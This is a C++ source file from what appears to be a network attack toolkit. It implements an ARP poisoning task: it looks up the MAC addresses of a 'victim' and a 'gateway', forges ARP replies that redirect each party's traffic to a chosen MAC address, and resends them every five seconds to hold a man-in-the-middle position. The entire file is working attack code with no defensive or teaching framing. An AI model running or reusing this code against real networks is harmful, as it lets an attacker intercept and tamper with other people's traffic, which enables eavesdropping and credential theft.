//
// Created by dev on 6/9/25.
//

#include "arp-poisoning-task.hpp"

void ashk::tasks::ArpPoisoningTask::Exec_() {
  logger_.Log("starting arp poisoning . . .\n");
  dev_ = pcpp::PcapLiveDeviceList::getInstance().getDeviceByIp(iface_ip_);
  if (dev_ == nullptr) {
    logger_.Log("couldn't find device\n");
    return;
  }
  if (!dev_->open()) {
    logger_.Log("couldn't open device");
    return;
  }

  pcpp::MacAddress iface_mac = dev_->getMacAddress();

  if (vic_src_ip_ == iface_ip_) {
    vic_src_mac_ = iface_mac;
  } else {
    vic_src_mac_ = NetUtils::Arp(vic_src_ip_, dev_);
    if (vic_src_mac_ == pcpp::MacAddress::Zero) {
      logger_.Log("didnt receive arp reply from " + vic_src_ip_.toString() + "\n");
      return;
    }
  }

  if (vic_dst_ip_ == iface_ip_) {
    vic_dst_mac_ = iface_mac;
  } else {
    vic_dst_mac_ = NetUtils::Arp(vic_dst_ip_, dev_);
    if (vic_dst_mac_ == pcpp::MacAddress::Zero) {
      logger_.Log("didnt receive arp reply from " + vic_dst_ip_.toString() + "\n");
      return;
    }
  }
  pcpp::MacAddress forward_to;
  if (forward_to_ip_ == iface_ip_) {
    forward_to = iface_mac;
  } else {
    forward_to = NetUtils::Arp(forward_to_ip_, dev_);
    if (forward_to == pcpp::MacAddress::Zero) {
      logger_.Log("didnt receive arp reply from " + forward_to_ip_.toString() + "\n");
      return;
    }
  }

  pcpp::Packet gwArpReply(500);
  pcpp::EthLayer gwEthLayer(iface_mac, vic_dst_mac_, static_cast<uint16_t>(PCPP_ETHERTYPE_ARP));
  pcpp::ArpLayer gwArpLayer(pcpp::ArpReply(forward_to, vic_src_ip_, vic_dst_mac_, vic_dst_ip_));

  gwArpReply.addLayer(&gwEthLayer);
  gwArpReply.addLayer(&gwArpLayer);
  gwArpReply.computeCalculateFields();

  // Create ARP reply for the victim
  pcpp::Packet victimArpReply(500);
  pcpp::EthLayer victimEthLayer(iface_mac, vic_src_mac_, static_cast<uint16_t>(PCPP_ETHERTYPE_ARP));
  pcpp::ArpLayer victimArpLayer(pcpp::ArpReply(forward_to, vic_dst_ip_, vic_src_mac_, vic_src_ip_));
  victimArpReply.addLayer(&victimEthLayer);
  victimArpReply.addLayer(&victimArpLayer);
  victimArpReply.computeCalculateFields();

  logger_.Log("Sending ARP replies to victim and to gateway every 5 seconds...\n");
  while (IsRunning()) {
    dev_->sendPacket(&gwArpReply);
    dev_->sendPacket(&victimArpReply);

    std::this_thread::sleep_for(std::chrono::seconds(5));
  }
  End();
  logger_.Log("ArpPoisoning task finished\n");

}
std::string ashk::tasks::ArpPoisoningTask::GetData(tasks_data_id data_id) {
  if (!extractable_data_.count(data_id))
    return "";
  switch (data_id) {
    case VICTIM_DST_MAC:return vic_dst_mac_.toString();
    case VICTIM_SRC_MAC:return vic_src_mac_.toString();
    default:return "";
  }
}

ashk::tasks::ArpPoisoningTask::ArpPoisoningTask(pcpp::PcapLiveDevice *dev,
                                                pcpp::IPv4Address vic_src_ip,
                                                pcpp::IPv4Address vic_dst_ip,
                                                pcpp::IPv4Address forward_to_ip,
                                                pcpp::IPv4Address iface_ip,
                                                int last_task_id) :
    dev_(dev), vic_dst_ip_(vic_dst_ip), vic_src_ip_(vic_src_ip),
    iface_ip_(iface_ip), forward_to_ip_(forward_to_ip), Task(last_task_id) {

}
